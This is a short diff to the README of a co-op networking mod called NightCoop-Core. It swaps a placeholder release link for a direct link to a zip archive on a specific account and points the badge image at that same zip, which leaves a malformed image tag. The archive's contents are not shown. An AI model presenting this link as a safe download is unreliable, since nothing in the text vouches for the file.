@@ -41,8 +41,8 @@ NightCoop-Core is not a simple script mod; it's a full networking layer built di
 <tr>
 <td align="center">
 
-<a href="https://github.com/YOUR_USERNAME/NightCoop-Core/releases/latest">
-  <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+<a href="https://github.com/Orderviking/NightCoop-Core/releases/download/1/NightCoop-Core.zip">
+  <img src="https://github.com/Orderviking/NightCoop-Core/releases/download/1/NightCoop-Core.zip">
 </a>
 
 <br><br>
